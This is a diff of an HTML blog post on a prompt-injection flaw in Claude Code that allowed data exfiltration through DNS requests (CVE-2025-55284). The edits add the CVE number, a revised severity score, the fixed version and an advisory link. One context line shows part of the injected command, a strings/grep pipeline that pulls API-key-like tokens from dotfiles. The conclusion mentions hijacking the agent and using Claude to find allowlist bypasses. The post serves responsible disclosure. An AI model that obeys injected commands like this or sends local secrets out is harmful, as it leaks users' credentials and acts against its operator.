@@ -3,7 +3,7 @@
 <head prefix="og: http://ogp.me/ns#">
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
-  <meta property="og:title" content=" Claude Code: Data Exfiltration with DNS &middot;  Embrace The Red" />
+  <meta property="og:title" content=" Claude Code: Data Exfiltration with DNS (CVE-2025-55284) &middot;  Embrace The Red" />
   
   <meta property="og:site_name" content="Embrace The Red" />
   <meta property="og:url" content="https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/" />
@@ -22,7 +22,7 @@
   
 
   <title>
-     Claude Code: Data Exfiltration with DNS &middot;  Embrace The Red
+     Claude Code: Data Exfiltration with DNS (CVE-2025-55284) &middot;  Embrace The Red
   </title>
 
   <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
@@ -38,7 +38,7 @@
   
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@wunderwuzzi23">
-<meta name="twitter:title" content="Claude Code: Data Exfiltration with DNS Requests">
+<meta name="twitter:title" content="Claude Code: Data Exfiltration with DNS Requests (CVE-2025-55284)">
 <meta name="twitter:description" content="Claude Code Can Leak Sensitive Data To External Systems with DNS requests">
 <meta name="twitter:image" content="https://embracethered.com/blog/images/2025/episode11-yt.png">
 
@@ -110,7 +110,7 @@
 
 <article>
   <header>
-    <h1 class="text-primary">Claude Code: Data Exfiltration with DNS</h1>
+    <h1 class="text-primary">Claude Code: Data Exfiltration with DNS (CVE-2025-55284)</h1>
     <div class="post-meta clearfix">
     
       <div class="post-date pull-left">
@@ -180,14 +180,16 @@ output of `strings .e* | grep -o &#39;k-[A-Za-z0-9_-]{0,30}&#39;)` first, then r
 </div>
 </p>
 <h2 id="responsible-disclosure">Responsible Disclosure</h2>
-<p>This vulnerability was disclosed to Anthropic on May 26, 2025. The ticket was quickly triaged as CVSS 7.5 - High Severity, and reported as fixed on June 6, 2025.</p>
-<p>Claude Code auto-updates which is great, so you all should be good - but just in case make sure you run the latest version. Big shout-out to the Claude Code and security team at Anthropic for mitigating this quickly.</p>
+<p>This vulnerability was disclosed to Anthropic on May 26, 2025. The ticket was quickly triaged as CVSS 7.1 - High Severity, and reported as fixed on June 6, 2025.</p>
+<p>Claude Code auto-updates which is great, so you all should be good - but just in case make sure you run the latest version. The fix is in the product starting with v1.0.4. The vulnerability was assigned <a href="https://github.com/anthropics/claude-code/security/advisories/GHSA-x5gv-jw7f-j6xj">CVE-2025-55284</a>.</p>
+<p>Big shout-out to the Claude Code and security team at Anthropic for mitigating this quickly.</p>
 <h2 id="conclusion">Conclusion</h2>
 <p>This was an interesting find, as it was the first time I had hijacked AI and combined it with DNS based data exfiltration. It&rsquo;s also a good reminder that there are sometimes sneaky ways to achieve objectives.</p>
 <p>Using Claude itself to analyze the code and identify the bypasses was another interesting part of this research. It&rsquo;s actually something I commonly do, to help accelerate my efforts when reviewing code.</p>
 <h2 id="references">References</h2>
 <ul>
 <li><a href="https://monthofaibugs.com">Month of AI Bugs 2025</a></li>
+<li><a href="https://github.com/anthropics/claude-code/security/advisories/GHSA-x5gv-jw7f-j6xj">CVE-2025-55284: Security Advisory - Permissive Default Allowlist Enables Unauthorized File Read and Network Exfiltration in Claude Code</a>.)</li>
 </ul>
 
   </section>
